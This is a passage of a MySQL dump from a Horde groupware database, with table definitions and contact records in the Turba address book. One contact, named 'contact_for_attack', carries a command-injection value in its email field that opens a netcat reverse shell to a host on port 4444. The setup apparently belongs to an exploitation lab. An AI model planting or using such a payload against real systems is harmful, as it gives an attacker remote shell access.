INSERT INTO `rampage_types` VALUES (1,'calendar'),(3,'contact'),(2,'event'),(5,'note'),(4,'task');
/*!40000 ALTER TABLE `rampage_types` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rampage_user_tag_stats`
--

DROP TABLE IF EXISTS `rampage_user_tag_stats`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `rampage_user_tag_stats` (
  `user_id` int(10) unsigned NOT NULL,
  `tag_id` int(10) unsigned NOT NULL,
  `count` int(10) unsigned DEFAULT NULL,
  PRIMARY KEY (`user_id`,`tag_id`),
  KEY `rampage_user_tag_stats_tag_id` (`tag_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rampage_user_tag_stats`
--

LOCK TABLES `rampage_user_tag_stats` WRITE;
/*!40000 ALTER TABLE `rampage_user_tag_stats` DISABLE KEYS */;
/*!40000 ALTER TABLE `rampage_user_tag_stats` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rampage_users`
--

DROP TABLE IF EXISTS `rampage_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `rampage_users` (
  `user_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_name` varchar(255) NOT NULL,
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `rampage_users_user_name` (`user_name`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rampage_users`
--

LOCK TABLES `rampage_users` WRITE;
/*!40000 ALTER TABLE `rampage_users` DISABLE KEYS */;
INSERT INTO `rampage_users` VALUES (1,'Administrator'),(2,'mgmtadmin');
/*!40000 ALTER TABLE `rampage_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `trean_bookmarks`
--

DROP TABLE IF EXISTS `trean_bookmarks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `trean_bookmarks` (
  `bookmark_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bookmark_url` varchar(1024) DEFAULT NULL,
  `bookmark_title` varchar(255) DEFAULT NULL,
  `bookmark_description` varchar(1024) DEFAULT NULL,
  `bookmark_clicks` int(10) unsigned DEFAULT '0',
  `bookmark_http_status` varchar(5) DEFAULT NULL,
  `bookmark_dt` datetime DEFAULT NULL,
  `user_id` int(10) unsigned NOT NULL,
  `favicon_url` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`bookmark_id`),
  KEY `index_trean_bookmarks_on_bookmark_clicks` (`bookmark_clicks`),
  KEY `index_trean_bookmarks_on_user_id` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `trean_bookmarks`
--

LOCK TABLES `trean_bookmarks` WRITE;
/*!40000 ALTER TABLE `trean_bookmarks` DISABLE KEYS */;
/*!40000 ALTER TABLE `trean_bookmarks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `trean_schema_info`
--

DROP TABLE IF EXISTS `trean_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `trean_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `trean_schema_info`
--

LOCK TABLES `trean_schema_info` WRITE;
/*!40000 ALTER TABLE `trean_schema_info` DISABLE KEYS */;
INSERT INTO `trean_schema_info` VALUES (5);
/*!40000 ALTER TABLE `trean_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `turba_objects`
--

DROP TABLE IF EXISTS `turba_objects`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `turba_objects` (
  `object_id` varchar(32) NOT NULL,
  `owner_id` varchar(255) NOT NULL,
  `object_type` varchar(255) NOT NULL DEFAULT 'Object',
  `object_uid` varchar(255) DEFAULT NULL,
  `object_members` text,
  `object_firstname` varchar(255) DEFAULT NULL,
  `object_lastname` varchar(255) DEFAULT NULL,
  `object_middlenames` varchar(255) DEFAULT NULL,
  `object_nameprefix` varchar(32) DEFAULT NULL,
  `object_namesuffix` varchar(32) DEFAULT NULL,
  `object_alias` varchar(32) DEFAULT NULL,
  `object_photo` longblob,
  `object_phototype` varchar(10) DEFAULT NULL,
  `object_bday` varchar(10) DEFAULT NULL,
  `object_homestreet` varchar(255) DEFAULT NULL,
  `object_homepob` varchar(10) DEFAULT NULL,
  `object_homecity` varchar(255) DEFAULT NULL,
  `object_homeprovince` varchar(255) DEFAULT NULL,
  `object_homepostalcode` varchar(10) DEFAULT NULL,
  `object_homecountry` varchar(255) DEFAULT NULL,
  `object_workstreet` varchar(255) DEFAULT NULL,
  `object_workpob` varchar(10) DEFAULT NULL,
  `object_workcity` varchar(255) DEFAULT NULL,
  `object_workprovince` varchar(255) DEFAULT NULL,
  `object_workpostalcode` varchar(10) DEFAULT NULL,
  `object_workcountry` varchar(255) DEFAULT NULL,
  `object_tz` varchar(32) DEFAULT NULL,
  `object_geo` varchar(255) DEFAULT NULL,
  `object_email` varchar(255) DEFAULT NULL,
  `object_homephone` varchar(25) DEFAULT NULL,
  `object_workphone` varchar(25) DEFAULT NULL,
  `object_cellphone` varchar(25) DEFAULT NULL,
  `object_fax` varchar(25) DEFAULT NULL,
  `object_pager` varchar(25) DEFAULT NULL,
  `object_title` varchar(255) DEFAULT NULL,
  `object_role` varchar(255) DEFAULT NULL,
  `object_logo` longblob,
  `object_logotype` varchar(10) DEFAULT NULL,
  `object_company` varchar(255) DEFAULT NULL,
  `object_notes` text,
  `object_url` varchar(255) DEFAULT NULL,
  `object_freebusyurl` varchar(255) DEFAULT NULL,
  `object_pgppublickey` text,
  `object_smimepublickey` text,
  `object_anniversary` varchar(10) DEFAULT NULL,
  `object_department` varchar(255) DEFAULT NULL,
  `object_spouse` varchar(255) DEFAULT NULL,
  `object_homefax` varchar(25) DEFAULT NULL,
  `object_nickname` varchar(255) DEFAULT NULL,
  `object_assistantphone` varchar(25) DEFAULT NULL,
  `object_imaddress` varchar(255) DEFAULT NULL,
  `object_imaddress2` varchar(255) DEFAULT NULL,
  `object_imaddress3` varchar(255) DEFAULT NULL,
  `object_homephone2` varchar(25) DEFAULT NULL,
  `object_carphone` varchar(25) DEFAULT NULL,
  `object_workphone2` varchar(25) DEFAULT NULL,
  `object_radiophone` varchar(25) DEFAULT NULL,
  `object_companyphone` varchar(25) DEFAULT NULL,
  `object_otherstreet` varchar(255) DEFAULT NULL,
  `object_otherpob` varchar(10) DEFAULT NULL,
  `object_othercity` varchar(255) DEFAULT NULL,
  `object_otherprovince` varchar(255) DEFAULT NULL,
  `object_otherpostalcode` varchar(10) DEFAULT NULL,
  `object_othercountry` varchar(255) DEFAULT NULL,
  `object_yomifirstname` varchar(255) DEFAULT NULL,
  `object_yomilastname` varchar(255) DEFAULT NULL,
  `object_manager` varchar(255) DEFAULT NULL,
  `object_assistant` varchar(255) DEFAULT NULL,
  `object_workemail` varchar(255) DEFAULT NULL,
  `object_homeemail` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`object_id`),
  KEY `index_turba_objects_on_owner_id` (`owner_id`),
  KEY `index_turba_objects_on_object_email` (`object_email`),
  KEY `index_turba_objects_on_object_firstname` (`object_firstname`),
  KEY `index_turba_objects_on_object_lastname` (`object_lastname`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `turba_objects`
--

LOCK TABLES `turba_objects` WRITE;
/*!40000 ALTER TABLE `turba_objects` DISABLE KEYS */;
INSERT INTO `turba_objects` VALUES ('0xtaoWC6ZMfmuqhmcn4uHCJ','mgmtadmin','Object','20170605230836.2za6kjJSWovaOLUwbNSxBy0@mail.metropolis-general.com',NULL,'','contact_for_attack','','','','',NULL,NULL,NULL,'','','','','','','','','','','','','',NULL,'hereinj$(nc 192.168.203.190 4444 -e \'/bin/bash\')@any.com','','','','','','','',NULL,NULL,'','','','','-----BEGIN PGP PUBLIC KEY BLOCK-----\r\nVersion: SKS 1.1.5\r\nComment: Hostname: pgp.mit.edu\r\n\r\n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\r\n6A==\r\n=ulIR\r\n-----END PGP PUBLIC KEY BLOCK-----','',NULL,'','','',NULL,'','','','','','','','','','','','','','','','','','','',NULL,NULL),('Icv1gCMJsQWavTgp3AeYEdZ','mgmtadmin','Object','20170605225755.qFPIIcdfl5EUqPZoimsfPUs@mail.metropolis-general.com',NULL,'Joe','Graham',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'jmg3484@rit.edu',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: SKS 1.1.5\nComment: Hostname: pgp.mit.edu\n\nmQINBFZDkUkBEAC/s+2OHEGgzf4RmdHTtfTCmMT7ucjmrACPCqJuNGz6WQbK42uiRheCcfe7\n9NKdVw4Tb7bKYV35RvY1HSA/JO6Mi/VazQSDYjLfU2VIPAbV5995FEJ2JONJg+xX7GzrkQVn\nY2UrGI0JB5DW3vdFcFhODR5qbqnn7LAfoXbOn3hUBrz3TfcNaZACrAszsD3CQV6OndxYBCey\nBIInn77hmv1v7kpzmCGHiAIDKIfXW9PEHSHs1FmqPLUgwgT4gj1hoGbIF+6Bq1hA7FWWckiV\ndDqqfZn6wbihxosgWpi7u8LojyrauIH+f4ZvVogmIMqr4Hekeu5B0lyVqapd1o5UdA2LlVyc\no/cETZiNQparWuWJ3tXsDO2vHhjlPHvLa4wNEM43GdByBEB6ZNK0hU71LAH2ElJHDQPMRpyP\nMJoL41mGLZEezWni1AUdkQ2bg0YgBC5hGlC9XyILla+hXlHP4iCFlAd0ccwh325pysa9oc/h\nNe/klEkTj9/AExKfLIpDNcbeEtKTXgwg/y801n+tT9z0P6lPOD5nFuUrKYHmCoftBOYHrfnQ\nThE6KLKfViiU1EgpIjYlgT/t2/nxATyWBQF8WISQRWwaFJv4t2+OtJt5yFIW+erZxVpkHZYj\nY1sAnzHrSPwq6N2xt/xwlakXuvmcP8yQVmHxSVMmGVL7fE0HLQARAQABtBxKb2UgR3JhaGFt\nIDxqbWczNDg0QHJpdC5lZHU+iQI+BBMBAgAoBQJWQ5FJAhsjBQkJZgGABgsJCAcDAgYVCAIJ\nCgsEFgIDAQIeAQIXgAAKCRBs2ZQqjoXlCxvtD/44eOhGgRTF+67GLKBxFCKGJgv2r3L8a3pv\nQbiBb24A5DK5BqWh/wEu+T2x17YOg+kiPCvEToImLkwlRfgTNZOtkFVDHSBqxgbpo3k9BXGf\nLEvk583djNWXB8ztphbuTBxo77+86X4OYGyxk7K93yZ7IfjurcvcfGGqTzN0fWR2AgxlMl3a\n82VTpoH7cRf9uKgUXWfC6Ks4arPHde5qmkQTe5XF20EzndYTc5CMzV1r3PZDDR5Zin+5dabg\nuFKOpEAjvQcHHwhaH1kKctJ5gE1cJgwLAo0qxK1RyF9mNsiYIJKq9Ax254SSWT116RFpVOES\nC+fLTrNxeBgnF8KnuYK7CrGrluSbCBsB5vP8qjUbw/zJprsRYW/jZuPQog+3Vj1i9qE9mjvD\nc66dkqeMUQtxQ63QGu8xdaSnIj9hOYERDBAX4gVmlWGtjYKGtyRYGY18igKbpmBuLl/6XIlC\naLF7sEoFN0IbRJA74yAqgjBkqsmR05eGX1AunSRH04yhycuhVJrnSHIRsY4C7Lab+PaVxkfP\nNd4FGCAYh43VqBBXsUIQJfgp5e5Emeg56cQJUF6bLf6pEIvzrEqv3dgJFmcEnUH+zELXP7Kn\n1nH43pdPpE9ARS7mIDbLQKDYtIyR2yRxzPGBAltPN1pS1gseA/uhs2Y7iE2t0IfRNxV7Vv1Y\ne7kCDQRWQ5FJARAAwATdhQOJEQUsd0ppaOqtCfqp0YTuxk5IzGDoC0I6lq6gC5h4VDEZemgc\nK9CDqEQeQVwUHvUlArnMipGnqgO+niUus4cSApHlOAfkrd8udxQntId1+NW5pq5sp8aSczDP\npDrxlztwPtfsL0y2ICHmhqejZmgAM496AhVPUdObDnLPgeA4xPs+JMCnRBB+64q0qvl2uzan\n5dyjtFPJ8hAa9D3YyuhYqpZcmkNy22Af4O4JnDPVb+ymtqCLFb59ij04QZ14B8a/9Jj9lkL6\nFWlVyeYEogoTsNCbXNJ4TFqrW220WZXJkm4iLkpU8vAO/NRtxM1jKKPr4atn20uXCmTScI11\nVLrUBRxpFx6NL7gWGPp9sQPTt3J3xNg1Yc7zK5JTW2HbAijZHrvtF7TUw0C2mfWCuB5ccHw4\n4S/nkytzt09Sz9Le8rnWxgqg08qpLgSE6VEuOI8zkfeoLeCsosYyDeZjtx1QKdd0XB3aL/A5\njHhmB46qDfkMO0ARlTAhalNDq5F6xwUQ1DKM5wfji+FM0qShlf38LKYWh1kQbGY66JjWVbg6\nJ4fCmHd3QDsoExpoEB/R41Nw+F0zRcU/lWKEfeQXzzKbczrQ/oMGwKOh6upN9A3hpryc+iYu\nLire3v+fi0v2o7MgPAL/FwVy36gAAiJFYVIrmzBGUxZiO5lAZO8AEQEAAYkCJQQYAQIADwUC\nVkORSQIbDAUJCWYBgAAKCRBs2ZQqjoXlC/blD/wJSIK7++yjEkHRQUdb9HG3sAiDSzJP3LJ7\nJ8kpLha46PqhsxQ6ZXM+FJimHqHqKHk6nLd/AFcnlfbY6nda80cyvUOi2IlHCdXN7+WpJ6Fp\n77f3oFh1vONG7XAgZBgXxXpceZTCXUQwia504R92pYOPJoNH1HaFEDNQx4xGIw9Lwoz+gPc2\nsAiUmKnGUI0EOXPL4nUZ3r0DUX1hqKKwZKQoQbE/pliDRvHpaLzX+bihZgM+Ae6TukScnt0X\nuxJAOvbdPHr18gKohAKBuVjzd0cBjEgGjcE/ybqcZ4XnGjkwtY7+9njuiin1Yzci3QTEMi51\neEYm/HYzqKuRmNFXNUKz02nbGvwFbeWcbBiSQFY6NHoDfdf5UBVeU7sLBfRLM/kkcvXOOsSJ\n3W3ao1UTxouOZrllpRzv1OZcLRjNMIEdm6nyhBCS55iWwa39tLWkOyu9Kfrunqg+x02oiAiW\nZflQ6qea1a0AP3o5F8r1eQ4y1adCUmyvCc9KS2hzr5PaQX43I5ndWl88iu1EZyR10/fdz0aT\n7C1K3ucRelf4gPXBkyoRCAID8xpYV9TZjJ1lYu8S7w+C7B9M9K81XUns1dNUJPr6BYSst3Yk\nmlWlS0LR1Ryk42PrwWtecrp6skzFudmJ1MNdHRD3SnIkgMGCiZR5owUBlkQnfHOKH4J+nIQc\n6A==\n=ulIR\n-----END PGP PUBLIC KEY BLOCK-----',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL),('nNTF7kHkEQJ5een7-6NRun9','mgmtadmin','Object','20170605230311.iuxg_zuuiXpAJNn59LzI28t@mail.metropolis-general.com',NULL,'','mymailboxwithPGPkey','','','','',NULL,NULL,NULL,'','','','','','','','','','','','','',NULL,'mymailboxwithPGP@any.com','','','','','','','',NULL,NULL,'','','','','-----BEGIN PGP PUBLIC KEY BLOCK-----\r\nVersion: SKS 1.1.5\r\nComment: Hostname: pgp.mit.edu\r\n\r\nmQINBFZDkUkBEAC/s+2OHEGgzf4RmdHTtfTCmMT7ucjmrACPCqJuNGz6WQbK42uiRheCcfe7\r\n9NKdVw4Tb7bKYV35RvY1HSA/JO6Mi/VazQSDYjLfU2VIPAbV5995FEJ2JONJg+xX7GzrkQVn\r\nY2UrGI0JB5DW3vdFcFhODR5qbqnn7LAfoXbOn3hUBrz3TfcNaZACrAszsD3CQV6OndxYBCey\r\nBIInn77hmv1v7kpzmCGHiAIDKIfXW9PEHSHs1FmqPLUgwgT4gj1hoGbIF+6Bq1hA7FWWckiV\r\ndDqqfZn6wbihxosgWpi7u8LojyrauIH+f4ZvVogmIMqr4Hekeu5B0lyVqapd1o5UdA2LlVyc\r\no/cETZiNQparWuWJ3tXsDO2vHhjlPHvLa4wNEM43GdByBEB6ZNK0hU71LAH2ElJHDQPMRpyP\r\nMJoL41mGLZEezWni1AUdkQ2bg0YgBC5hGlC9XyILla+hXlHP4iCFlAd0ccwh325pysa9oc/h\r\nNe/klEkTj9/AExKfLIpDNcbeEtKTXgwg/y801n+tT9z0P6lPOD5nFuUrKYHmCoftBOYHrfnQ\r\nThE6KLKfViiU1EgpIjYlgT/t2/nxATyWBQF8WISQRWwaFJv4t2+OtJt5yFIW+erZxVpkHZYj\r\nY1sAnzHrSPwq6N2xt/xwlakXuvmcP8yQVmHxSVMmGVL7fE0HLQARAQABtBxKb2UgR3JhaGFt\r\nIDxqbWczNDg0QHJpdC5lZHU+iQI+BBMBAgAoBQJWQ5FJAhsjBQkJZgGABgsJCAcDAgYVCAIJ\r\nCgsEFgIDAQIeAQIXgAAKCRBs2ZQqjoXlCxvtD/44eOhGgRTF+67GLKBxFCKGJgv2r3L8a3pv\r\nQbiBb24A5DK5BqWh/wEu+T2x17YOg+kiPCvEToImLkwlRfgTNZOtkFVDHSBqxgbpo3k9BXGf\r\nLEvk583djNWXB8ztphbuTBxo77+86X4OYGyxk7K93yZ7IfjurcvcfGGqTzN0fWR2AgxlMl3a\r\n82VTpoH7cRf9uKgUXWfC6Ks4arPHde5qmkQTe5XF20EzndYTc5CMzV1r3PZDDR5Zin+5dabg\r\nuFKOpEAjvQcHHwhaH1kKctJ5gE1cJgwLAo0qxK1RyF9mNsiYIJKq9Ax254SSWT116RFpVOES\r\nC+fLTrNxeBgnF8KnuYK7CrGrluSbCBsB5vP8qjUbw/zJprsRYW/jZuPQog+3Vj1i9qE9mjvD\r\nc66dkqeMUQtxQ63QGu8xdaSnIj9hOYERDBAX4gVmlWGtjYKGtyRYGY18igKbpmBuLl/6XIlC\r\naLF7sEoFN0IbRJA74yAqgjBkqsmR05eGX1AunSRH04yhycuhVJrnSHIRsY4C7Lab+PaVxkfP\r\nNd4FGCAYh43VqBBXsUIQJfgp5e5Emeg56cQJUF6bLf6pEIvzrEqv3dgJFmcEnUH+zELXP7Kn\r\n1nH43pdPpE9ARS7mIDbLQKDYtIyR2yRxzPGBAltPN1pS1gseA/uhs2Y7iE2t0IfRNxV7Vv1Y\r\ne7kCDQRWQ5FJARAAwATdhQOJEQUsd0ppaOqtCfqp0YTuxk5IzGDoC0I6lq6gC5h4VDEZemgc\r\nK9CDqEQeQVwUHvUlArnMipGnqgO+niUus4cSApHlOAfkrd8udxQntId1+NW5pq5sp8aSczDP\r\npDrxlztwPtfsL0y2ICHmhqejZmgAM496AhVPUdObDnLPgeA4xPs+JMCnRBB+64q0qvl2uzan\r\n5dyjtFPJ8hAa9D3YyuhYqpZcmkNy22Af4O4JnDPVb+ymtqCLFb59ij04QZ14B8a/9Jj9lkL6\r\nFWlVyeYEogoTsNCbXNJ4TFqrW220WZXJkm4iLkpU8vAO/NRtxM1jKKPr4atn20uXCmTScI11\r\nVLrUBRxpFx6NL7gWGPp9sQPTt3J3xNg1Yc7zK5JTW2HbAijZHrvtF7TUw0C2mfWCuB5ccHw4\r\n4S/nkytzt09Sz9Le8rnWxgqg08qpLgSE6VEuOI8zkfeoLeCsosYyDeZjtx1QKdd0XB3aL/A5\r\njHhmB46qDfkMO0ARlTAhalNDq5F6xwUQ1DKM5wfji+FM0qShlf38LKYWh1kQbGY66JjWVbg6\r\nJ4fCmHd3QDsoExpoEB/R41Nw+F0zRcU/lWKEfeQXzzKbczrQ/oMGwKOh6upN9A3hpryc+iYu\r\nLire3v+fi0v2o7MgPAL/FwVy36gAAiJFYVIrmzBGUxZiO5lAZO8AEQEAAYkCJQQYAQIADwUC\r\nVkORSQIbDAUJCWYBgAAKCRBs2ZQqjoXlC/blD/wJSIK7++yjEkHRQUdb9HG3sAiDSzJP3LJ7\r\nJ8kpLha46PqhsxQ6ZXM+FJimHqHqKHk6nLd/AFcnlfbY6nda80cyvUOi2IlHCdXN7+WpJ6Fp\r\n77f3oFh1vONG7XAgZBgXxXpceZTCXUQwia504R92pYOPJoNH1HaFEDNQx4xGIw9Lwoz+gPc2\r\nsAiUmKnGUI0EOXPL4nUZ3r0DUX1hqKKwZKQoQbE/pliDRvHpaLzX+bihZgM+Ae6TukScnt0X\r\nuxJAOvbdPHr18gKohAKBuVjzd0cBjEgGjcE/ybqcZ4XnGjkwtY7+9njuiin1Yzci3QTEMi51\r\neEYm/HYzqKuRmNFXNUKz02nbGvwFbeWcbBiSQFY6NHoDfdf5UBVeU7sLBfRLM/kkcvXOOsSJ\r\n3W3ao1UTxouOZrllpRzv1OZcLRjNMIEdm6nyhBCS55iWwa39tLWkOyu9Kfrunqg+x02oiAiW\r\nZflQ6qea1a0AP3o5F8r1eQ4y1adCUmyvCc9KS2hzr5PaQX43I5ndWl88iu1EZyR10/fdz0aT\r\n7C1K3ucRelf4gPXBkyoRCAID8xpYV9TZjJ1lYu8S7w+C7B9M9K81XUns1dNUJPr6BYSst3Yk\r\nmlWlS0LR1Ryk42PrwWtecrp6skzFudmJ1MNdHRD3SnIkgMGCiZR5owUBlkQnfHOKH4J+nIQc\r\n6A==\r\n=ulIR\r\n-----END PGP PUBLIC KEY BLOCK-----','',NULL,'','','',NULL,'','','','','','','','','','','','','','','','','','','',NULL,NULL);
/*!40000 ALTER TABLE `turba_objects` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `turba_schema_info`
--

DROP TABLE IF EXISTS `turba_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `turba_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `turba_schema_info`
--

LOCK TABLES `turba_schema_info` WRITE;
/*!40000 ALTER TABLE `turba_schema_info` DISABLE KEYS */;
INSERT INTO `turba_schema_info` VALUES (11);
/*!40000 ALTER TABLE `turba_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `turba_shares`
--

DROP TABLE IF EXISTS `turba_shares`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `turba_shares` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) NOT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `perm_creator` int(11) NOT NULL DEFAULT '0',
  `perm_default` int(11) NOT NULL DEFAULT '0',
  `perm_guest` int(11) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `attribute_params` text,
  `share_parents` varchar(4000) DEFAULT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_turba_shares_on_share_name` (`share_name`),
  KEY `index_turba_shares_on_share_owner` (`share_owner`),
  KEY `index_turba_shares_on_perm_creator` (`perm_creator`),
  KEY `index_turba_shares_on_perm_default` (`perm_default`),
  KEY `index_turba_shares_on_perm_guest` (`perm_guest`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `turba_shares`
--

